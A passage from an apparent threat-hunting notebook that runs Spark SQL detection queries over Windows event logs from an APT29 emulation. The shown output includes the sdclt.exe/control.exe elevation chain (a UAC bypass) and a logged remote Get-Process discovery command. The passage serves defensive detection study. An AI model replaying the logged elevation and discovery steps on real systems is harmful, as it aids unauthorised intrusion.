 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;88&quot;
                                                                                                                                                                                                                                                                 
-RECORD 80----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;269&quot;
 
-RECORD 81----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;87&quot;
                                                                                                                                                                                                                                                                 
-RECORD 82----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;268&quot;
 
-RECORD 83----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;87&quot;
                                                                                                                                                                                                                                                                 
-RECORD 84----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;267&quot;
 
-RECORD 85----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;87&quot;
                                                                                                                                                                                                                                                                 
-RECORD 86----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;266&quot;
 
-RECORD 87----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;86&quot;
                                                                                                                                                                                                                                                                 
-RECORD 88----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;265&quot;
 
-RECORD 89----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;86&quot;
                                                                                                                                                                                                                                                                 
-RECORD 90----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;264&quot;
 
-RECORD 91----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;86&quot;
                                                                                                                                                                                                                                                                 
-RECORD 92----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;263&quot;
 
-RECORD 93----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;85&quot;
                                                                                                                                                                                                                                                                 
-RECORD 94----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;262&quot;
 
-RECORD 95----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;85&quot;
                                                                                                                                                                                                                                                                 
-RECORD 96----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;261&quot;
 
-RECORD 97----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;85&quot;
                                                                                                                                                                                                                                                                 
-RECORD 98----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;260&quot;
 
-RECORD 99----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;84&quot;
                                                                                                                                                                                                                                                                 
only showing top 100 rows
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:4310F2AF-11EF-4EAC-A968-3436FE5F6140</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN(</span>
<span class="sd">      SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT NewProcessId</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">            AND EventID = 4688</span>
<span class="sd">            AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ProcessId = b.NewProcessId</span>
<span class="sd">      WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">        AND a.EventID = 4688</span>
<span class="sd">        AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">        AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ProcessId = c.NewProcessId</span>
<span class="sd">    WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">      AND d.EventID = 4688</span>
<span class="sd">      AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">    AND f.EventID = 4104</span>
<span class="sd">    AND LOWER(f.ScriptBlockText) LIKE &quot;%expand-archive%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
Expand-Archive -LiteralPath &quot;$env:USERPROFILE\Downloads\SysinternalsSuite.zip&quot; -DestinationPath &quot;$env:USERPROFILE\Downloads\&quot;

ScriptBlock ID: 63fc6cf4-cd9f-4134-9231-51ccb5c7d247
Path:  
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-1-process-discovery">
<h2>4.B.1. Process Discovery<a class="headerlink" href="#b-1-process-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Enumerated current running processes using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing Get-Process</p>
<div class="section" id="id22">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id22" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:CE6D61C3-C3B5-43D2-BD3C-4C1711A822DA</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessId</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">    AND f.EventID = 4104</span>
<span class="sd">    AND LOWER(f.ScriptBlockText) LIKE &quot;%get-process%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
Invoke-Command -ComputerName NASHUA -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like &quot;*\$env:USERNAME&quot; } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId

ScriptBlock ID: 806f4593-7cce-4e2c-8645-8cb798c3bedd
Path:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
-RECORD 1--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------